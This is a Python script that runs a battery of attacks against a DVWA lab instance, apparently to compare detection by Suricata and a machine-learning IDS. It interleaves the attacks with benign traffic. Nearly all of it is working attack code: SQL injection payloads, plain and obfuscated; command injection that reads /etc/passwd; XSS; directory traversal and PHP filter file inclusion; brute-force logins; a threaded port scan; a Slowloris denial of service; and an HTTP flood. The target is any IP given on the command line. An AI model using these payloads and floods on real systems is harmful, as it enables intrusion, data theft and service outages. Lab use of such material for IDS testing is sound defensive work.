#!/usr/bin/env python3

import requests
import socket
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

class ComprehensiveAttackSuite:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.base_url = f"http://{target_ip}:{target_port}/dvwa"
        self.session = requests.Session()
        self.results = {}
        
        # Login to DVWA first
        self.login_dvwa()
    
    def login_dvwa(self):
        """Login to DVWA and get session cookie"""
        print("[*] Logging into DVWA...")
        try:
            # Get login page to obtain CSRF token
            response = self.session.get(f"{self.base_url}/login.php")
            
            # Login with default credentials
            login_data = {
                'username': 'admin',
                'password': 'password',
                'Login': 'Login'
            }
            response = self.session.post(f"{self.base_url}/login.php", data=login_data)
            
            # Set security level to low
            self.session.get(f"{self.base_url}/security.php?security=low")
            
            print("[+] Successfully logged into DVWA\n")
        except Exception as e:
            print(f"[!] Error logging in: {e}")
    
    # ========================================
    # TEST 1: SQL Injection Attacks
    # ========================================
    
    def test_basic_sqli(self):
        """Basic SQL Injection (Suricata SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 1A: BASIC SQL INJECTION ATTACKS")
        print("Expected: Suricata ✓ | ML-IDS ✓")
        print("="*70)
        
        attacks = [
            ("Classic UNION SELECT", "1' UNION SELECT null,user() #"),
            ("OR 1=1 bypass", "1' OR '1'='1"),
            ("Boolean-based blind", "1' AND '1'='1"),
            ("Comment injection", "1' --"),
            ("Information schema", "1' UNION SELECT null,table_name FROM information_schema.tables #"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            try:
                url = f"{self.base_url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
                print(f"  Testing: {label}")
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    success_count += 1
                    print(f"    ✓ Payload delivered")
                else:
                    print(f"    ✗ Failed ({response.status_code})")
                
                time.sleep(0.5)
            except Exception as e:
                print(f"    ✗ Error: {e}")
        
        self.results['basic_sqli'] = {'total': len(attacks), 'success': success_count}
        print(f"\nBasic SQLi: {success_count}/{len(attacks)} successful")
    
    def test_obfuscated_sqli(self):
        """Obfuscated SQL Injection (Suricata might MISS, ML should DETECT)"""
        print("\n" + "="*70)
        print("TEST 1B: OBFUSCATED SQL INJECTION ATTACKS")
        print("Expected: Suricata ⚠️ | ML-IDS ✓")
        print("="*70)
        
        attacks = [
            ("URL encoded UNION", "1%27%20UNION%20SELECT%20null,user()%20%23"),
            ("Whitespace obfuscation", "1'    UNION    SELECT    null,user() #"),
            ("Comment obfuscation", "1'/**/UNION/**/SELECT/**/null,user() #"),
            ("Mixed case", "1' uNiOn SeLeCt null,user() #"),
            ("Hex encoding", "1' UNION SELECT 0x61646d696e,user() #"),
            ("Double encoding", "1%2527%2520UNION%2520SELECT%2520null,user()%2520%2523"),
            ("Null byte injection", "1'%00 UNION SELECT null,user() #"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            try:
                url = f"{self.base_url}/vulnerabilities/sqli/?id={payload}&Submit=Submit"
                print(f"  Testing: {label}")
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    success_count += 1
                    print(f"    ✓ Payload delivered")
                else:
                    print(f"    ✗ Failed ({response.status_code})")
                
                time.sleep(0.5)
            except Exception as e:
                print(f"    ✗ Error: {e}")
        
        self.results['obfuscated_sqli'] = {'total': len(attacks), 'success': success_count}
        print(f"\nObfuscated SQLi: {success_count}/{len(attacks)} successful")
    
    # ========================================
    # TEST 2: Command Injection Attacks
    # ========================================
    
    def test_command_injection(self):
        """Command Injection (Both SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 2: COMMAND INJECTION ATTACKS")
        print("Expected: Suricata ✓ | ML-IDS ✓")
        print("="*70)
        
        attacks = [
            ("Semicolon separator", "127.0.0.1; ls -la"),
            ("Pipe separator", "127.0.0.1 | whoami"),
            ("AND operator", "127.0.0.1 && cat /etc/passwd"),
            ("OR operator", "127.0.0.1 || id"),
            ("Command substitution", "127.0.0.1; echo $(whoami)"),
            ("Backtick execution", "127.0.0.1; `whoami`"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            try:
                url = f"{self.base_url}/vulnerabilities/exec/?ip={quote(payload)}&Submit=Submit"
                print(f"  Testing: {label}")
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    success_count += 1
                    print(f"    ✓ Payload delivered")
                else:
                    print(f"    ✗ Failed ({response.status_code})")
                
                time.sleep(0.5)
            except Exception as e:
                print(f"    ✗ Error: {e}")
        
        self.results['command_injection'] = {'total': len(attacks), 'success': success_count}
        print(f"\nCommand Injection: {success_count}/{len(attacks)} successful")
    
    # ========================================
    # TEST 3: Port Scan Attack
    # ========================================
    
    def test_port_scan(self):
        """Port Scan (Both SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 3: PORT SCAN ATTACK")
        print("Expected: Suricata ✓ | ML-IDS ✓")
        print("="*70)
        
        print("[*] Scanning ports 1-1100...")
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((self.target_ip, port))
                sock.close()
                return port, result == 0
            except:
                return port, False
        
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = list(executor.map(scan_port, range(1, 1101)))
        
        elapsed = time.time() - start_time
        open_ports = [port for port, is_open in results if is_open]
        
        print(f"  ✓ Scanned 1100 ports in {elapsed:.2f}s")
        print(f"  Found {len(open_ports)} open ports")
        
        self.results['port_scan'] = {'total': 1100, 'time': elapsed}
    
    # ========================================
    # TEST 4: Brute Force Attack
    # ========================================
    
    def test_brute_force(self):
        """Brute Force (Both SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 4: BRUTE FORCE ATTACK")
        print("Expected: Suricata ✓ | ML-IDS ✓")
        print("="*70)
        
        print("[*] Attempting 30 rapid login attempts...")
        
        success_count = 0
        for i in range(30):
            try:
                login_data = {
                    'username': f'admin{i}',
                    'password': f'password{i}',
                    'Login': 'Login'
                }
                response = self.session.post(f"{self.base_url}/vulnerabilities/brute/", data=login_data, timeout=5)
                
                if response.status_code == 200:
                    success_count += 1
                
                print(f"  Attempt {i+1}/30", end='\r')
                time.sleep(0.2)
            except:
                pass
        
        print(f"\n  ✓ Completed {success_count}/30 attempts")
        self.results['brute_force'] = {'total': 30, 'success': success_count}
    
    # ========================================
    # TEST 5: XSS Attack
    # ========================================
    
    def test_xss(self):
        """Cross-Site Scripting (Both SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 5: XSS ATTACKS")
        print("Expected: Suricata ✓ | ML-IDS ✓")
        print("="*70)
        
        attacks = [
            ("Basic script tag", "<script>alert('XSS')</script>"),
            ("IMG onerror", "<img src=x onerror=alert('XSS')>"),
            ("Event handler", "<body onload=alert('XSS')>"),
            ("JavaScript protocol", "<a href='javascript:alert(\"XSS\")'>Click</a>"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            try:
                url = f"{self.base_url}/vulnerabilities/xss_r/?name={quote(payload)}"
                print(f"  Testing: {label}")
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    success_count += 1
                    print(f"    ✓ Payload delivered")
                else:
                    print(f"    ✗ Failed ({response.status_code})")
                
                time.sleep(0.5)
            except Exception as e:
                print(f"    ✗ Error: {e}")
        
        self.results['xss'] = {'total': len(attacks), 'success': success_count}
        print(f"\nXSS: {success_count}/{len(attacks)} successful")
    
    # ========================================
    # TEST 6: File Inclusion Attack
    # ========================================
    
    def test_file_inclusion(self):
        """File Inclusion (Both SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 6: FILE INCLUSION ATTACKS")
        print("Expected: Suricata ✓ | ML-IDS ✓")
        print("="*70)
        
        attacks = [
            ("Directory traversal", "../../../../../../etc/passwd"),
            ("Null byte", "../../../../../../etc/passwd%00"),
            ("PHP wrapper", "php://filter/convert.base64-encode/resource=index.php"),
        ]
        
        success_count = 0
        for label, payload in attacks:
            try:
                url = f"{self.base_url}/vulnerabilities/fi/?page={quote(payload)}"
                print(f"  Testing: {label}")
                response = self.session.get(url, timeout=5)
                
                if response.status_code == 200:
                    success_count += 1
                    print(f"    ✓ Payload delivered")
                else:
                    print(f"    ✗ Failed ({response.status_code})")
                
                time.sleep(0.5)
            except Exception as e:
                print(f"    ✗ Error: {e}")
        
        self.results['file_inclusion'] = {'total': len(attacks), 'success': success_count}
        print(f"\nFile Inclusion: {success_count}/{len(attacks)} successful")
    
    # ========================================
    # TEST 7: Slowloris DoS Attack
    # ========================================
    
    def test_slowloris(self):
        """Slowloris DoS (Suricata might MISS, ML-IDS SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 7: SLOWLORIS DoS ATTACK")
        print("Expected: Suricata ❌ | ML-IDS ✓")
        print("="*70)
        
        print("[*] Creating slow HTTP connections...")
        
        sockets = []
        for i in range(50):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                sock.send(f"GET /?{i} HTTP/1.1\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept-language: en-US,en\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        print(f"  ✓ Created {len(sockets)} slow connections")
        
        # Keep connections alive with incomplete headers
        print("[*] Keeping connections alive with slow headers...")
        for _ in range(10):
            for sock in sockets:
                try:
                    sock.send(f"X-a: {time.time()}\r\n".encode())
                except:
                    pass
            time.sleep(0.5)
        
        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
        
        print("  ✓ Slowloris attack completed")
        self.results['slowloris'] = {'sockets': len(sockets)}
    
    # ========================================
    # TEST 8: HTTP Flood Attack
    # ========================================
    
    def test_http_flood(self):
        """HTTP Flood (Suricata might MISS, ML-IDS SHOULD detect)"""
        print("\n" + "="*70)
        print("TEST 8: HTTP FLOOD ATTACK")
        print("Expected: Suricata ❌ | ML-IDS ✓")
        print("="*70)
        
        print("[*] Sending 200 rapid HTTP requests...")
        
        def make_request(_):
            try:
                requests.get(f"{self.base_url}/", timeout=2)
                return True
            except:
                return False
        
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=50) as executor:
            results = list(executor.map(make_request, range(200)))
        
        elapsed = time.time() - start_time
        success = sum(1 for r in results if r)
        
        print(f"  ✓ Sent {success}/200 requests in {elapsed:.2f}s")
        print(f"  Rate: {success/elapsed:.2f} req/s")
        
        self.results['http_flood'] = {'total': 200, 'success': success, 'time': elapsed}
    
    # ========================================
    # Benign Traffic Tests
    # ========================================
    
    def test_benign_browsing(self):
        """Test 9: Benign browsing - normal legitimate page access"""
        print("\n" + "="*70)
        print("TEST 9: Benign Browsing Activity")
        print("Expected: Both IDS ❌ (No alerts)")
        print("="*70)
        
        benign_urls = [
            f"{self.base_url}/",
            f"{self.base_url}/about.php",
            f"{self.base_url}/instructions.php",
            f"{self.base_url}/security.php",
            f"{self.base_url}/phpinfo.php",
        ]
        
        print("[*] Simulating normal user browsing...")
        successful = 0
        for url in benign_urls:
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code == 200:
                    successful += 1
                    print(f"  ✓ Browsed: {url.split('/')[-1]}")
                time.sleep(1)  # Normal user behavior
            except:
                pass
        
        print(f"  ✓ Completed {successful}/{len(benign_urls)} page views")
        self.results['benign_browsing'] = {'total': len(benign_urls), 'success': successful}

    def test_benign_login(self):
        """Test 10: Benign login - normal authentication attempts"""
        print("\n" + "="*70)
        print("TEST 10: Benign Login Activity")
        print("Expected: Both IDS ❌ (No alerts)")
        print("="*70)
        
        login_url = f"{self.base_url}/login.php"
        credentials = [
            ('admin', 'password'),  # correct
            ('user', 'user123'),    # trying different account
        ]
        
        print("[*] Performing normal login attempts...")
        successful = 0
        for username, password in credentials:
            try:
                response = self.session.post(
                    login_url,
                    data={'username': username, 'password': password, 'Login': 'Login'},
                    timeout=3
                )
                successful += 1
                print(f"  ✓ Login attempt: {username}")
                time.sleep(3)  # Normal delay between attempts
            except:
                pass
        
        print(f"  ✓ Completed {successful}/{len(credentials)} login attempts")
        self.results['benign_login'] = {'total': len(credentials), 'success': successful}

    def test_benign_search(self):
        """Test 11: Benign search - legitimate search queries"""
        print("\n" + "="*70)
        print("TEST 11: Benign Search Activity")
        print("Expected: Both IDS ❌ (No alerts)")
        print("="*70)
        
        search_queries = [
            "documentation",
            "help guide",
            "tutorial",
            "user manual",
        ]
        
        print("[*] Performing legitimate searches...")
        successful = 0
        for query in search_queries:
            try:
                search_url = f"{self.base_url}/vulnerabilities/xss_r/?name={requests.utils.quote(query)}"
                response = self.session.get(search_url, timeout=3)
                if response.status_code == 200:
                    successful += 1
                    print(f"  ✓ Searched: '{query}'")
                time.sleep(1)
            except:
                pass
        
        print(f"  ✓ Completed {successful}/{len(search_queries)} searches")
        self.results['benign_search'] = {'total': len(search_queries), 'success': successful}

    def test_benign_file_access(self):
        """Test 12: Benign file access - normal resource loading"""
        print("\n" + "="*70)
        print("TEST 12: Benign File Access")
        print("Expected: Both IDS ❌ (No alerts)")
        print("="*70)
        
        file_urls = [
            f"{self.base_url}/dvwa/css/main.css",
            f"{self.base_url}/dvwa/images/logo.png",
            f"{self.base_url}/favicon.ico",
        ]
        
        print("[*] Accessing normal static resources...")
        successful = 0
        for url in file_urls:
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code in [200, 304]:
                    successful += 1
                    print(f"  ✓ Loaded: {url.split('/')[-1]}")
                time.sleep(0.5)
            except:
                pass
        
        print(f"  ✓ Completed {successful}/{len(file_urls)} file accesses")
        self.results['benign_file_access'] = {'total': len(file_urls), 'success': successful}

    def test_benign_api_calls(self):
        """Test 13: Benign API calls - legitimate data requests"""
        print("\n" + "="*70)
        print("TEST 13: Benign API Activity")
        print("Expected: Both IDS ❌ (No alerts)")
        print("="*70)
        
        api_endpoints = [
            f"{self.base_url}/security.php",
            f"{self.base_url}/setup.php",
            f"{self.base_url}/vulnerabilities/captcha/",
        ]
        
        print("[*] Making legitimate API calls...")
        successful = 0
        for url in api_endpoints:
            try:
                response = self.session.get(url, timeout=3)
                if response.status_code in [200, 302]:
                    successful += 1
                    print(f"  ✓ API call: {url.split('/')[-2]}")
                time.sleep(1)
            except:
                pass
        
        print(f"  ✓ Completed {successful}/{len(api_endpoints)} API calls")
        self.results['benign_api_calls'] = {'total': len(api_endpoints), 'success': successful}
    
    # ========================================
    # Main Execution
    # ========================================
    
    def print_summary(self):
        """Print attack summary"""
        print("\n" + "="*70)
        print("ATTACK SUITE SUMMARY")
        print("="*70)
        
        # Separate malicious and benign tests
        malicious_tests = ['basic_sqli', 'obfuscated_sqli', 'command_injection', 
                          'port_scan', 'brute_force', 'xss', 'file_inclusion', 
                          'slowloris', 'http_flood']
        benign_tests = ['benign_browsing', 'benign_login', 'benign_search', 
                       'benign_file_access', 'benign_api_calls']
        
        print("\n📛 MALICIOUS TRAFFIC:")
        for test in malicious_tests:
            if test in self.results:
                data = self.results[test]
                print(f"  {test.replace('_', ' ').title()}: {data}")
        
        print("\n✅ BENIGN TRAFFIC:")
        for test in benign_tests:
            if test in self.results:
                data = self.results[test]
                print(f"  {test.replace('_', ' ').title()}: {data}")
        
        print("\n" + "="*70)
        print("CHECK THE DASHBOARD TO COMPARE DETECTION RATES!")
        print("="*70)
        print("\nExpected Results:")
        print("✓ Malicious (Both Detect): SQLi (basic), Command Injection, Port Scan, Brute Force, XSS, File Inclusion")
        print("✓ Malicious (ML Advantage): SQLi (obfuscated), Slowloris, HTTP Flood")
        print("✓ Benign (Both Ignore): All benign traffic should NOT trigger alerts")
        print("\n")
    
    def run_all_attacks(self):
        """Execute all attack tests with mixed benign traffic"""
        print("\n" + "="*70)
        print("COMPREHENSIVE ATTACK SUITE WITH BENIGN TRAFFIC")
        print(f"Target: {self.base_url}")
        print("="*70)
        
        # Mix malicious and benign traffic for realistic testing
        print("\n🎯 PHASE 1: Malicious Attacks")
        self.test_basic_sqli()
        time.sleep(2)
        
        # Benign traffic between attacks
        self.test_benign_browsing()
        time.sleep(2)
        
        self.test_obfuscated_sqli()
        time.sleep(2)
        
        self.test_benign_login()
        time.sleep(2)
        
        self.test_command_injection()
        time.sleep(2)
        
        self.test_benign_search()
        time.sleep(2)
        
        self.test_port_scan()
        time.sleep(2)
        
        self.test_benign_file_access()
        time.sleep(2)
        
        self.test_brute_force()
        time.sleep(2)
        
        self.test_xss()
        time.sleep(2)
        
        self.test_benign_api_calls()
        time.sleep(2)
        
        self.test_file_inclusion()
        time.sleep(2)
        
        print("\n🎯 PHASE 2: DoS Attacks")
        self.test_slowloris()
        time.sleep(2)
        
        self.test_http_flood()
        
        # Print summary
        self.print_summary()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python3 attack_suite.py <target_ip> [port]")
        print("Example: python3 attack_suite.py 172.18.0.2 80")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    attacker = ComprehensiveAttackSuite(target_ip, target_port)
    attacker.run_all_attacks()